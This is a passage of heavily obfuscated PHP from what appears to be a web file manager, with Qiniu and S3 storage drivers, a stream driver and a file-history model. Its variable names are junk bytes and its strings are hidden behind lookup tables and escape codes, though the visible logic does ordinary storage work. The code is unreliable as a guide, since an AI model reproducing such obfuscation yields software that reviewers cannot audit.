check_abort(); list($òÍõ×, $„÷­•½×) = $this->bucketManager->listFiles($this->bucket, $İŸÑÃû­, $ƒ€ã«©Ğ, $“¡°ñßÇ, $íøº’„); if ($„÷­•½×) { break; } $ƒ€ã«©Ğ = array_key_exists($ºÄ‚†¦Ê[1472], $òÍõ×) ? $ƒ€ã«©Ğ = $òÍõ×[$ºÄ‚†¦Ê[1530]] : $ºÄ‚†¦Ê[12]; $îïÁ²ë¡ = isset($òÍõ×[$ºÄ‚†¦Ê[1531]]) ? $òÍõ×[$ºÄ‚†¦Ê[1531]] : array(); $¤¯¨àé½ = isset($òÍõ×[$ºÄ‚†¦Ê[1532]]) ? $òÍõ×[$ºÄ‚†¦Ê[1532]] : array(); foreach ($îïÁ²ë¡ as $Ó´Æİû¤) { if ($Ó´Æİû¤[$ºÄ‚†¦Ê[97]] == $İŸÑÃû­) { continue; } $ö’–ÑÛ = $Ó´Æİû¤[$ºÄ‚†¦Ê[97]]; $‚º†© ¤ = $Ó´Æİû¤[$ºÄ‚†¦Ê[1528]]; $Ó´Æİû¤[$ºÄ‚†¦Ê[79]] = $‚º†© ¤; $Ô‚ÀÚ­€ = $‚º†© ¤ == 0 && substr($ö’–ÑÛ, strlen($ö’–ÑÛ) - 1, 1) == $ºÄ‚†¦Ê[8] ? !0 : !1; $this->cacheMethodInfoSet($ö’–ÑÛ, $Ô‚ÀÚ­€, $Ó´Æİû¤); if ($Ô‚ÀÚ­€) { $úÄ®Ñêñ[] = $ö’–ÑÛ; continue; } $óÃ€‘•¢[] = $Ÿş©†Ûæ ? $Ó´Æİû¤ : $ö’–ÑÛ; } foreach ($¤¯¨àé½ as $ö’–ÑÛ) { if ($ö’–ÑÛ == $İŸÑÃû­) { continue; } $úÄ®Ñêñ[] = $ö’–ÑÛ; $this->cacheMethodInfoSet($ö’–ÑÛ, !0); } if ($ƒ€ã«©Ğ === $ºÄ‚†¦Ê[12]) { break; } } $this->cacheMethodInfoSet($¢Ëìú‡â, !0); return array($ºÄ‚†¦Ê[85] => $úÄ®Ñêñ, $ºÄ‚†¦Ê[86] => $óÃ€‘•¢); } public function canRead($Ëºâµ) { return $this->exist($Ëºâµ) ? !0 : !1; } public function canWrite($¹›¼‡²‰) { return $this->exist($¹›¼‡²‰) ? !0 : !1; } public function getContent($©Ñ÷Ğ——) { return $this->fileSubstr($©Ñ÷Ğ——, 0, -1); } public function setContent($ÆÎúœ×œ, $™Û”›åî = '') { $öÜ£ıØ = $this->tempFile($this->pathThis($ÆÎúœ×œ)); file_put_contents($öÜ£ıØ, $™Û”›åî); if ($this->upload($ÆÎúœ×œ, $öÜ£ıØ)) { $this->tempFileRemve($öÜ£ıØ); return !0; } return !1; } public function refreshUrls($Âêˆœ¬º) { $·Œ‰öŸõ =& $_SERVER[÷åé¼î]; $¥ç»úğÊ = array(); if (is_array($Âêˆœ¬º)) { foreach ($Âêˆœ¬º as $Œ‚‚´—) { $¥ç»úğÊ[] = $this->link($Œ‚‚´—); } } else { $¥ç»úğÊ[] = $this->link($Âêˆœ¬º); } $ßâåÒ‚½ = new Qiniu\Cdn\CdnManager($this->auth); list($·¡Ô˜Å, $ƒÄÆùÛŞ) = $ßâåÒ‚½->refreshUrls($¥ç»úğÊ); if ($ƒÄÆùÛŞ) { return !1; } return $·¡Ô˜Å[$·Œ‰öŸõ[1258]] == $·Œ‰öŸõ[824] ? !0 : !1; } public function fileSubstr($ß—¢‚®·, $˜¯¬°àÎ, $µ¢Öõ´«) { $ä×ùàİ© =& $_SERVER[÷åé¼î]; if (!($ó“ƒÓòÏ = $this->link($ß—¢‚®·))) { return !1; } $á™•ğØ = !1; if ($µ¢Öõ´« > 0) { $ÙÜÜ¸æ = $˜¯¬°àÎ + $µ¢Öõ´« - 1; $á™•ğØ = array($ä×ùàİ©[1533] . $˜¯¬°àÎ . $ä×ùàİ©[446] . $ÙÜÜ¸æ); } $Ä²ÂÓ = url_request($ó“ƒÓòÏ, $ä×ùàİ©[261], !1, $á™•ğØ); return $Ä²ÂÓ[$ä×ùàİ©[815]] ? $Ä²ÂÓ[$ä×ùàİ©[1281]] : !1; } public function upload($ĞĞÍõ‚, $Ü’ƒÚƒ, $ööŞü¶Í = false, $Ç³ŠÙÁ = REPEAT_REPLACE) { $˜ŠŸ°É¯ = new Qiniu\Storage\UploadManager(); $¾áşí¨î = $this->auth->uploadToken($this->bucket, $ĞĞÍõ‚); $óÍ–¾„á = get_file_mime(get_path_ext($Ü’ƒÚƒ)); list($¤ºó¨¯, $õøõª¿š) = $˜ŠŸ°É¯->putFile($¾áşí¨î, $ĞĞÍõ‚, $Ü’ƒÚƒ, null, $óÍ–¾„á); return $õøõª¿š ? !1 : $this->getPathOuter($ĞĞÍõ‚); } public function uploadFormData($ş÷…±âª, $„î¹»Ë = 3600) { return $this->uploadToken($ş÷…±âª, $„î¹»Ë); } public function multiUploadFormData($‚Î¡‘ô, $»ö…ÀûÑ = 3600) { return $this->uploadToken($‚Î¡‘ô, $»ö…ÀûÑ); } private function uploadToken($åì¾íØŠ, $ÖßÇñ¦ = 3600) { $èß¹¡Â¥ =& $_SERVER[÷åé¼î]; $´şá˜å— = $ÖßÇñ¦; $°¹¶«¤ = array($èß¹¡Â¥[1534] => $èß¹¡Â¥[1535]); $´®Á„ü… = $åì¾íØŠ; $ãÚÑä„¿ = $this->auth->uploadToken($this->bucket, $´®Á„ü…, $´şá˜å—, $°¹¶«¤, !0); $ãĞ»¯¨š = empty($this->region) || $this->region == $èß¹¡Â¥[1536] ? $èß¹¡Â¥[12] : $èß¹¡Â¥[446] . $this->region; $Ú¿ÊˆÍ = http_type() . "\72\57\x2f\x75\x70\154\x6f\141\144{$ãĞ»¯¨š}\56\x71\x69\156\x69\x75\x70\56\143\x6f\155\57"; return array($èß¹¡Â¥[1537] => $ãÚÑä„¿, $èß¹¡Â¥[1538] => $Ú¿ÊˆÍ); } public function download($»ä·Ãİü, $¢ßŒ·÷ä) { $²ì©ßƒè = IO::getPathInner(IO::mkfile($¢ßŒ·÷ä)); if (!($¹±Ë…Áü = $this->link($»ä·Ãİü))) { return !1; } $°ø–€ğ° = 0; $˜ ùÄï = 1024 * 200; $‘†æ±Òú = fopen($²ì©ßƒè, $_SERVER[÷åé¼î][1539]); while (!0) { $ßğ­×…ô = $this->fileSubstr($»ä·Ãİü, $°ø–€ğ°, $˜ ùÄï); if ($ßğ­×…ô === !1) { return !1; } fwrite($‘†æ±Òú, $ßğ­×…ô); $°ø–€ğ° += $˜ ùÄï; if (strlen($ßğ­×…ô) < $˜ ùÄï) { break; } } fclose($‘†æ±Òú); return $¢ßŒ·÷ä; } public function link($ºšÜ¿ª‰, $×Ê‘ç¥î = '') { if (!$this->isFile($ºšÜ¿ª‰)) { return !1; } $’¸÷–é® = $this->getHost() . $_SERVER[÷åé¼î][8] . $this->pathEncode($ºšÜ¿ª‰) . $×Ê‘ç¥î; return $this->auth->privateDownloadUrl($’¸÷–é®, 3600 * 12); } public function fileOut($Ï÷ş‰Õ, $­ä·ÑôÄ = false, $¿Ë‹» = false, $ÛÏÆõ†’ = '') { $ÒªŸöóü =& $_SERVER[÷åé¼î]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ï÷ş‰Õ, $­ä·ÑôÄ, $¿Ë‹», $ÛÏÆõ†’); } if (!$¿Ë‹») { $¿Ë‹» = $this->pathThis($Ï÷ş‰Õ); } $Ö‚ìäÛş = $­ä·ÑôÄ ? $ÒªŸöóü[1540] . rawurlencode($¿Ë‹») : $ÒªŸöóü[12]; $ìÆÑğ­¾ = $this->link($Ï÷ş‰Õ, $Ö‚ìäÛş); $this->fileOutLink($ìÆÑğ­¾); } public function fileOutServer($Ğã®î¨‹, $¾µÕ›Ô = false, $§Á„µ = false, $ú¹­ø›ˆ = '') { parent::fileOut($Ğã®î¨‹, $¾µÕ›Ô, $§Á„µ, $ú¹­ø›ˆ); } public function fileOutImage($ªòÛö÷â, $Å˜ùÄş’ = 250) { if ($this->size($ªòÛö÷â) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ªòÛö÷â, $Å˜ùÄş’); } $¶­ÇÆ§ = $this->link($ªòÛö÷â, $_SERVER[÷åé¼î][1541] . $Å˜ùÄş’); $this->fileOutLink($¶­ÇÆ§); } public function fileOutImageServer($ù½©ßÑú, $”ŒøÍç = 250) { parent::fileOutImage($ù½©ßÑú, $”ŒøÍç); } public function hashMd5($²Îù®Ëü) { $øÍ¥‡¦— =& $_SERVER[÷åé¼î]; $÷åã´ = $this->objectMeta($²Îù®Ëü); return isset($÷åã´[$øÍ¥‡¦—[245]]) ? $÷åã´[$øÍ¥‡¦—[245]] : !1; $Å¡ªùâÂ = $this->link($²Îù®Ëü, $øÍ¥‡¦—[1542]); } public function size($Šú©Ö—) { $õ‰Îôæ† = $this->objectMeta($Šú©Ö—); return $õ‰Îôæ† ? $õ‰Îôæ†[$_SERVER[÷åé¼î][79]] : 0; } public function info($øİÅéÉæ) { if ($this->isFolder($øİÅéÉæ)) { return $this->folderInfo($øİÅéÉæ); } else { if ($this->isFile($øİÅéÉæ)) { return $this->fileInfo($øİÅéÉæ); } } return !1; } public function exist($öä–ò) { return $this->isFile($öä–ò) || $this->isFolder($öä–ò); } public function isFile($‡É·½ğÇ) { return !$this->isFolder($‡É·½ğÇ) && $this->objectMeta($‡É·½ğÇ); } public function isFolder($ÆŒÅã–Ü) { return $this->cacheMethod($_SERVER[÷åé¼î][179], $ÆŒÅã–Ü); } protected function objectMeta($¤ ¾¹ô») { return $this->cacheMethod($_SERVER[÷åé¼î][181], $¤ ¾¹ô»); } protected function _objectMeta($×“«â›İ) { $Ûêï©áƒ =& $_SERVER[÷åé¼î]; list($œ‡¹¢«ˆ, $°¿Ô«åÒ) = $this->bucketManager->stat($this->bucket, $×“«â›İ); if ($œ‡¹¢«ˆ) { $œ‡¹¢«ˆ[$Ûêï©áƒ[79]] = intval($œ‡¹¢«ˆ[$Ûêï©áƒ[1528]]); } return $œ‡¹¢«ˆ; } protected function _isFolder($ÛÓı°áÏ) { $ç½ğ‰²› =& $_SERVER[÷åé¼î]; if ($ÛÓı°áÏ == $ç½ğ‰²›[12] || $ÛÓı°áÏ == $ç½ğ‰²›[8]) { return !0; } list($Á§†ƒø¾, $üÎ©›‡û) = $this->bucketManager->listFiles($this->bucket, trim($ÛÓı°áÏ, $ç½ğ‰²›[8]) . $ç½ğ‰²›[8], $ç½ğ‰²›[12], 1, $ç½ğ‰²›[8]); return !empty($Á§†ƒø¾[$ç½ğ‰²›[1531]]) || !empty($Á§†ƒø¾[$ç½ğ‰²›[1532]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ˆíİ¬îÅ) { parent::__construct($ˆíİ¬îÅ); } public function uploadFormData($Àá“Ş”÷, $İ¿ òŒ = 3600) { $Ñß²É´ =& $_SERVER[÷åé¼î]; $¯”ğïÄ = $Ñß²É´[229]; $ïµÈ©ğº = $Ñß²É´[270]; $êÆµç“Æ = $Ñß²É´[62]; $éÇ·¦˜ = gmdate($Ñß²É´[271]); $°ÙÇ«­ù = gmdate($Ñß²É´[272]); $Ä«óöˆ = $Ñß²É´[273]; $÷íĞ÷ôš = $İ¿ òŒ . $Ñß²É´[12]; $í„ı÷ä« = $Ñß²É´[274]; $—Ë‹ö†Ã = array($this->accessKey, $°ÙÇ«­ù, $this->region, $êÆµç“Æ, $Ä«óöˆ); $ŠÒ»Á± = implode($Ñß²É´[8], $—Ë‹ö†Ã); $‹¶Õëêì = array($Ñß²É´[275] => gmdate($Ñß²É´[1406], strtotime($Ñß²É´[277])), $Ñß²É´[278] => array(array($Ñß²É´[279] => $this->bucket), array($Ñß²É´[280] => $¯”ğïÄ), array($Ñß²É´[281], $Ñß²É´[282], $Ñß²É´[12]), array($Ñß²É´[281], $Ñß²É´[283], $Ñß²É´[12]), array($Ñß²É´[281], $Ñß²É´[284], $Ñß²É´[12]), array($Ñß²É´[285] => $í„ı÷ä«), array($Ñß²É´[286] => $ŠÒ»Á±), array($Ñß²É´[287] => $ïµÈ©ğº), array($Ñß²É´[288] => $éÇ·¦˜), array($Ñß²É´[289] => $÷íĞ÷ôš))); $’ãÇşòÄ = base64_encode(json_encode($‹¶Õëêì)); $ÎÉŒÚé— = hash_hmac($Ñß²É´[290], $°ÙÇ«­ù, $Ñß²É´[291] . $this->secret, !0); $éçÌæÎ = hash_hmac($Ñß²É´[290], $this->region, $ÎÉŒÚé—, !0); $Ò˜¹˜İ = hash_hmac($Ñß²É´[290], $êÆµç“Æ, $éçÌæÎ, !0); $øÔ³¡‰· = hash_hmac($Ñß²É´[290], $Ä«óöˆ, $Ò˜¹˜İ, !0); $„Óî‹ô = hash_hmac($Ñß²É´[290], $’ãÇşòÄ, $øÔ³¡‰·); $‰½à¸è = array($Ñß²É´[246] => $Ñß²É´[12], $Ñß²É´[292] => $Ñß²É´[12], $Ñß²É´[280] => $¯”ğïÄ, $Ñß²É´[285] => $í„ı÷ä«, $Ñß²É´[293] => $’ãÇşòÄ, $Ñß²É´[294] => $ŠÒ»Á±, $Ñß²É´[295] => $ïµÈ©ğº, $Ñß²É´[296] => $éÇ·¦˜, $Ñß²É´[297] => $÷íĞ÷ôš, $Ñß²É´[298] => $„Óî‹ô, $Ñß²É´[208] => $this->getHost()); return $‰½à¸è; } public function multiUploadFormData($şèÈ—…§, $ºÊúÕ³ = 3600) { $ÔŠ·¤ğ =& $_SERVER[÷åé¼î]; $œ™äÔ¦ = gmdate($ÔŠ·¤ğ[1543]); $¾ÀÏÃÇ = array(); $ëùşÊù½ = $this->client->getUploadId($this->bucket, $şèÈ—…§, $¾ÀÏÃÇ); if (!$ëùşÊù½) { return !1; } return array($ÔŠ·¤ğ[254] => $ëùşÊù½, $ÔŠ·¤ğ[208] => $this->getHost() . $ÔŠ·¤ğ[8] . $this->pathEncode($şèÈ—…§), $ÔŠ·¤ğ[255] => $œ™äÔ¦, $ÔŠ·¤ğ[97] => $şèÈ—…§); } public function multiUploadAuthData($¤€å¶á , $ü²µÂ = array()) { $ˆâÚ¹† =& $_SERVER[÷åé¼î]; $Òª’Ÿ  = isset($ü²µÂ[$ˆâÚ¹†[169]]) ? $ü²µÂ[$ˆâÚ¹†[169]] : $ˆâÚ¹†[12]; $¸›½İ°ğ = $ü²µÂ[$ˆâÚ¹†[97]]; unset($ü²µÂ[$ˆâÚ¹†[97]]); if (isset($ü²µÂ[$ˆâÚ¹†[256]])) { return $this->listUploadParts($¸›½İ°ğ, $ü²µÂ); } $¨ÅÇ¥ä› = array(); if (isset($ü²µÂ[$ˆâÚ¹†[1544]])) { $¨ÅÇ¥ä›[$ˆâÚ¹†[1545]] = $ü²µÂ[$ˆâÚ¹†[1544]]; } $åòø¸‹¶ = explode($ˆâÚ¹†[210], $this->getHost()); $ÄËû³—Š = array($ˆâÚ¹†[1546] => $åòø¸‹¶[1], $ˆâÚ¹†[1547] => $ˆâÚ¹†[12], $ˆâÚ¹†[246] => $ˆâÚ¹†[123], $ˆâÚ¹†[292] => $ü²µÂ[$ˆâÚ¹†[79]]); $ëşø™¨ = $ˆâÚ¹†[259]; $óµ×şÉø = $ˆâÚ¹†[8] . $this->pathEncode($¸›½İ°ğ) . $Òª’Ÿ ; $ÒãÇâãê = $this->client->__getSignatureV4($¨ÅÇ¥ä›, $ÄËû³—Š, $ëşø™¨, $óµ×şÉø); if (strpos($Òª’Ÿ , $ˆâÚ¹†[258]) === 0) { if (isset($¨ÅÇ¥ä›[$ˆâÚ¹†[1545]])) { $ÙôÚ¼ğ§ = $¨ÅÇ¥ä›[$ˆâÚ¹†[1545]]; } else { if (isset($ÒãÇâãê[$ˆâÚ¹†[1545]])) { $ÙôÚ¼ğ§ = $ÒãÇâãê[$ˆâÚ¹†[1545]]; } else { $ÙôÚ¼ğ§ = hash($ˆâÚ¹†[290], $ˆâÚ¹†[12]); } } return array($ˆâÚ¹†[265] => $ÒãÇâãê[$ˆâÚ¹†[265]], $ˆâÚ¹†[1545] => $ÙôÚ¼ğ§, $ˆâÚ¹†[255] => $ÒãÇâãê[$ˆâÚ¹†[1548]]); } return $ÒãÇâãê[$ˆâÚ¹†[265]]; } public function listUploadParts($¦Ù°èó¡, $éãÔãûË = array()) { $¼ªŸ‰²ğ =& $_SERVER[÷åé¼î]; $ú§Å¢€ = str_replace($¼ªŸ‰²ğ[266], $¼ªŸ‰²ğ[12], $éãÔãûË[$¼ªŸ‰²ğ[169]]); $ôÓ¸â¡© = $this->client->listParts($this->bucket, $¦Ù°èó¡, $ú§Å¢€); if (!$ôÓ¸â¡©) { return !1; } $¤èä®» = $¼ªŸ‰²ğ[1549]; foreach ($ôÓ¸â¡© as $•ıä•¼¶) { $¤èä®» .= $¼ªŸ‰²ğ[1550] . "\x3c\120\141\162\164\116\x75\x6d\x62\x65\x72\76{$•ıä•¼¶[$¼ªŸ‰²ğ[1478]]}\x3c\57\120\x61\x72\x74\116\x75\155\x62\x65\162\x3e\12" . "\x3c\x45\x54\141\147\76{$•ıä•¼¶[$¼ªŸ‰²ğ[1479]]}\x3c\x2f\105\x54\141\147\x3e\12" . $¼ªŸ‰²ğ[1551]; } $¤èä®» .= $¼ªŸ‰²ğ[1552]; $€Ğ“¼éè = array(); $©¸ÅóŠ± = explode($¼ªŸ‰²ğ[210], $this->getHost()); $©ìß¹«­ = array($¼ªŸ‰²ğ[1546] => $©¸ÅóŠ±[1], $¼ªŸ‰²ğ[246] => $¼ªŸ‰²ğ[123], $¼ªŸ‰²ğ[292] => strlen($¤èä®»)); $¦ıÈ–µé = $¼ªŸ‰²ğ[257]; $¨ª©Ù­ç = $¼ªŸ‰²ğ[8] . $this->pathEncode($¦Ù°èó¡) . $éãÔãûË[$¼ªŸ‰²ğ[169]]; $û¥¬¥‡‚ = $this->client->__getSignatureV4($€Ğ“¼éè, $©ìß¹«­, $¦ıÈ–µé, $¨ª©Ù­ç, $¤èä®»); return array($¼ªŸ‰²ğ[265] => $û¥¬¥‡‚[$¼ªŸ‰²ğ[265]], $¼ªŸ‰²ğ[255] => $û¥¬¥‡‚[$¼ªŸ‰²ğ[1548]], $¼ªŸ‰²ğ[267] => $ôÓ¸â¡©, $¼ªŸ‰²ğ[1545] => $û¥¬¥‡‚[$¼ªŸ‰²ğ[1545]]); } public function link($Ş¼°¼ìÇ, $ºÍƒ’‹ê = array()) { return parent::link($Ş¼°¼ìÇ, $ºÍƒ’‹ê); } public function fileOut($­ŒÊóÚ¡, $²ß©®Ìò = false, $á¨œ¯¿… = false, $ÌòÔ€ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[÷åé¼î][1553])) { return parent::fileOutServer($­ŒÊóÚ¡, $²ß©®Ìò, $á¨œ¯¿…, $ÌòÔ€); } parent::fileOut($­ŒÊóÚ¡, $²ß©®Ìò, $á¨œ¯¿…, $ÌòÔ€); } public function fileOutImage($‹î‹Û‰¯, $›ú¼ˆÆ² = 250) { if (strstr($this->endpoint, $_SERVER[÷åé¼î][1553])) { return parent::fileOutImageServer($‹î‹Û‰¯, $›ú¼ˆÆ²); } parent::fileOutImage($‹î‹Û‰¯, $›ú¼ˆÆ²); } public function fileOutLink($ÎäÖŸ¬û) { $ôİ¢Şª =& $_SERVER[÷åé¼î]; if (substr($ÎäÖŸ¬û, 0, 7) == $ôİ¢Şª[1404]) { $ÎäÖŸ¬û = $ôİ¢Şª[1405] . substr($ÎäÖŸ¬û, 7); } header($ôİ¢Şª[175] . $ÎäÖŸ¬û); die; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($èæ£¶•, $ÙÀ€ûğĞ = 0) { parent::__construct(); $this->source = $èæ£¶•; $this->sourceSize = $ÙÀ€ûğĞ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($¥ÄÀÕ¹Œ = false) { return $this->sourceSize; } public function getContent($ï²‚Üáø = false) { return $this->fileSubstr($ï²‚Üáø, 0, $this->sourceSize); } public function fileSubstr($Ä‡ÅÏ‚• = false, $âö«Èûğ = 0, $À·Âç†ª = 0) { if (!$À·Âç†ª) { $À·Âç†ª = $this->sourceSize; } $Ø¨”ü¹© = $this->sourceSize - $âö«Èûğ; if ($À·Âç†ª >= $Ø¨”ü¹©) { $À·Âç†ª = $Ø¨”ü¹©; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $âö«Èûğ, $À·Âç†ª); } if ($this->sourceType == self::TYPE_FILE) { if ($À·Âç†ª <= 0) { return $_SERVER[÷åé¼î][12]; } $¤·¶ÓÂå = ftell($this->source); fseek_64($this->source, $¤·¶ÓÂå + $âö«Èûğ); $¡–õ÷æß = @fread($this->source, $À·Âç†ª); fseek_64($this->source, $¤·¶ÓÂå); return $¡–õ÷æß; } } public function hashMd5($¡±ø™Ÿ = false) { return md5($this->getContent()); } public static function hash($‡‡’†¦¢, $˜ÙÃ›ğ = 0) { $ÛÕÈ£¤Í = new PathDriverStream($‡‡’†¦¢, $˜ÙÃ›ğ); return $ÛÕÈ£¤Í->hashSimple($‡‡’†¦¢); } public static function md5($³™ÅÔ÷, $Üú“Š¶ = 0) { $ˆÈÛ¿ò = new PathDriverStream($³™ÅÔ÷, $Üú“Š¶); return $ˆÈÛ¿ò->hashMd5($³™ÅÔ÷); } } goto dĞƒÎ§¥½¢; C­Ö•İğ¡×: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\162\143\145\137\150\x69\x73\164\157\x72\171"; public function historyCount($×âÔøã™) { $ôÏ÷Èìª =& $_SERVER[÷åé¼î]; if (!$×âÔøã™) { return array(); } if (is_string($×âÔøã™) || is_int($×âÔøã™)) { $×âÔøã™ = array($×âÔøã™); } $¢Á €€Ç = array($ôÏ÷Èìª[193], $ôÏ÷Èìª[2010] => $ôÏ÷Èìª[549]); $ï«†¢›ã = array($ôÏ÷Èìª[193] => array($ôÏ÷Èìª[7], $×âÔøã™)); $î®Œ‘• = $this->field($¢Á €€Ç)->where($ï«†¢›ã)->group($ôÏ÷Èìª[193])->select(); return array_to_keyvalue($î®Œ‘•, $ôÏ÷Èìª[193], $ôÏ÷Èìª[549]); } public function addHistory($¥Øáí†©, $÷ÙÉ’Š¥ = '') { $‰‰¨Àí =& $_SERVER[÷åé¼î]; $¼†ºîû = array($‰‰¨Àí[475] => $¥Øáí†©[$‰‰¨Àí[193]], $‰‰¨Àí[1770] => isset($¥Øáí†©[$‰‰¨Àí[513]]) ? $¥Øáí†©[$‰‰¨Àí[513]] : $¥Øáí†©[$‰‰¨Àí[511]], $‰‰¨Àí[526] => $¥Øáí†©[$‰‰¨Àí[525]], $‰‰¨Àí[601] => $¥Øáí†©[$‰‰¨Àí[79]], $‰‰¨Àí[2227] => $÷ÙÉ’Š¥); if ($GLOBALS[$‰‰¨Àí[6]][$‰‰¨Àí[92]][$‰‰¨Àí[1296]] >= 1) { $this->historyAutoClear($¼†ºîû[$‰‰¨Àí[193]]); $this->add($¼†ºîû); } Hook::trigger($‰‰¨Àí[2228], $¼†ºîû); Model($‰‰¨Àí[2229])->eventFileEdit($¥Øáí†©[$‰‰¨Àí[193]]); } private function historyAutoClear($ÚÔ÷Íê) { $ùîÛÎ„˜ =& $_SERVER[÷åé¼î]; $šŒŞ‘ƒˆ = Model($ùîÛÎ„˜[835])->get($ùîÛÎ„˜[1318]); $™ÁÇœü• = intval($GLOBALS[$ùîÛÎ„˜[6]][$ùîÛÎ„˜[92]][$ùîÛÎ„˜[1296]]); $áÁ£¹Í = $šŒŞ‘ƒˆ == $ùîÛÎ„˜[1319] ? min(5, $™ÁÇœü•) : $™ÁÇœü•; $áÁ£¹Í = $áÁ£¹Í <= 0 ? 0 : $áÁ£¹Í - 1; if ($áÁ£¹Í >= 499) { return; } $ñÎÑÒØ = array($ùîÛÎ„˜[475] => $ÚÔ÷Íê); $†“µİ´ = $this->field($ùîÛÎ„˜[2230])->where($ñÎÑÒØ)->order($ùîÛÎ„˜[2224])->select(); if (!$†“µİ´ || $áÁ£¹Í >= count($†“µİ´)) { return; } $ÎàÆ§”™ = array_to_keyvalue($†“µİ´, $ùîÛÎ„˜[12], $ùîÛÎ„˜[459]); $ÎàÆ§”™ = array_slice($ÎàÆ§”™, $áÁ£¹Í); $‘‚†ûœ¥ = array_to_keyvalue($†“µİ´, $ùîÛÎ„˜[12], $ùîÛÎ„˜[525]); $‘‚†ûœ¥ = array_slice($‘‚†ûœ¥, $áÁ£¹Í); if (!$ÎàÆ§”™ || !$‘‚†ûœ¥) { return; } $ñÎÑÒØ = array($ùîÛÎ„˜[477] => array($ùîÛÎ„˜[7], $ÎàÆ§”™)); $this->where($ñÎÑÒØ)->delete(); Model($ùîÛÎ„˜[528])->remove($‘‚†ûœ¥); } public function listData($ÀöæÛ‹õ) { $Ï„¾ŞîÕ =& $_SERVER[÷åé¼î]; $…ßé›Š = array($Ï„¾ŞîÕ[475] => $ÀöæÛ‹õ); $³û†Ã¢ˆ = $Ï„¾ŞîÕ[2231]; $àÏëšå = $this->field($³û†Ã¢ˆ)->where($…ßé›Š)->order($Ï„¾ŞîÕ[2224])->selectPage(); $this->_listAppendUser($àÏëšå[$Ï„¾ŞîÕ[429]]); $­Ç­ ­ = Model($Ï„¾ŞîÕ[835])->get($Ï„¾ŞîÕ[1318]); $Ã»¾†” = 5; if ($­Ç­ ­ == $Ï„¾ŞîÕ[1319]) { $àÏëšå[$Ï„¾ŞîÕ[429]] = array_slice($àÏëšå[$Ï„¾ŞîÕ[429]], 0, $Ã»¾†”); $àÏëšå[$Ï„¾ŞîÕ[426]] = array($Ï„¾ŞîÕ[2232] => 1, $Ï„¾ŞîÕ[2233] => 20, $Ï„¾ŞîÕ[2234] => 1, $Ï„¾ŞîÕ[2235] => count($àÏëšå[$Ï„¾ŞîÕ[429]])); } return $àÏëšå; } protected function _listAppendUser(&$Îç¼ÎØÜ) { $ëÍ§ÎÁ =& $_SERVER[÷åé¼î]; $Âô¢Áø¦ = array_to_keyvalue($Îç¼ÎØÜ, $ëÍ§ÎÁ[12], $ëÍ§ÎÁ[1779]); $ƒÖñÊ‚Ó = Model($ëÍ§ÎÁ[582])->userListInfo($Âô¢Áø¦); foreach ($Îç¼ÎØÜ as &$æ…’ÔÍ) { $Ç ¢‘§ = $æ…’ÔÍ[$ëÍ§ÎÁ[1779]]; $æ…’ÔÍ[$ëÍ§ÎÁ[511]] = $ƒÖñÊ‚Ó[$Ç ¢‘§] ? $ƒÖñÊ‚Ó[$Ç ¢‘§] : !1; } unset($æ…’ÔÍ); } public function fileInfo($ş¥à»İÆ) { $ıèÑ‹Ôæ =& $_SERVER[÷åé¼î]; $±«Ï¯œš = $this->tablePrefix; $ëƒ„·Ó = "{$±«Ï¯œš}\x69\x6f\x5f\x66\151\154\145\40\x66\151\x6c\x65\163\40\157\x6e\40\146\x69\154\145\163\x2e\x66\151\154\145\x49\x44\x20\x3d\x20\x68\151\x73\x74\157\x72\x79\x2e\146\151\x6c\145\111\104"; return $this->alias($ıèÑ‹Ôæ[2236])->where(array($ıèÑ‹Ôæ[477] => $ş¥à»İÆ))->join($ëƒ„·Ó, $ıèÑ‹Ôæ[2237])->find(); } public function removeItem($ÜÔ¢òø») { $¾Ú¸×çé =& $_SERVER[÷åé¼î]; $œé¿¶æÕ = array($¾Ú¸×çé[477] => $ÜÔ¢òø»); $À´èÖ“ƒ = $this->where($œé¿¶æÕ)->find(); if ($À´èÖ“ƒ) { $ı ²…®ó = $this->where($œé¿¶æÕ)->delete(); Model($¾Ú¸×çé[528])->remove($À´èÖ“ƒ[$¾Ú¸×çé[525]]); return $ı ²…®ó; } return !1; } public function removeBySource($§¾æÉ»½) { $ºõ›ßñË =& $_SERVER[÷åé¼î]; if (!$§¾æÉ»½) { return !1; } if (!is_array($§¾æÉ»½)) { $§¾æÉ»½ = array($§¾æÉ»½); } $Ú³´Äî® = array($ºõ›ßñË[475] => array($ºõ›ßñË[7], $§¾æÉ»½)); $ìÉĞƒÂ = $this->field($ºõ›ßñË[526])->where($Ú³´Äî®)->select(); if ($ìÉĞƒÂ) { $this->where($Ú³´Äî®)->delete(); $ùŠÂö“ö = array_to_keyvalue($ìÉĞƒÂ, $ºõ›ßñË[12], $ºõ›ßñË[525]); Model($ºõ›ßñË[528])->remove($ùŠÂö“ö); } return !0; } public function setDetail($¸¤ÅÎÊ, $áïíäÏ) { $ŸÃÍıƒ =& $_SERVER[÷åé¼î]; return $this->where(array($ŸÃÍıƒ[477] => $¸¤ÅÎÊ))->save(array($ŸÃÍıƒ[2227] => $áïíäÏ)); } public function rollbackToItem($öÚ•±é™, $Õ› úÓ“) { $ÓÂ÷¾–ü =& $_SERVER[÷åé¼î]; $­¬²Ø¬Ô = Model($ÓÂ÷¾–ü[889])->sourceInfo($öÚ•±é™); $this->addHistory($­¬²Ø¬Ô, LNG($ÓÂ÷¾–ü[2238])); $Ø÷·äè = $this->find($Õ› úÓ“); $÷³×Û–‘ = array($ÓÂ÷¾–ü[525] => $Ø÷·äè[$ÓÂ÷¾–ü[525]], $ÓÂ÷¾–ü[79] => $Ø÷·äè[$ÓÂ÷¾–ü[79]], $ÓÂ÷¾–ü[88] => time(), $ÓÂ÷¾–ü[513] => USER_ID); Model($ÓÂ÷¾–ü[889])->where(array($ÓÂ÷¾–ü[193] => $öÚ•±é™))->save($÷³×Û–‘); return $this->where(array($ÓÂ÷¾–ü[477] => $Õ› úÓ“))->delete(); } public function clearSame($İŸĞéÔù) { $ºæÅù’© =& $_SERVER[÷åé¼î]; $Äë·Ôé¡ = $this->listData($İŸĞéÔù); 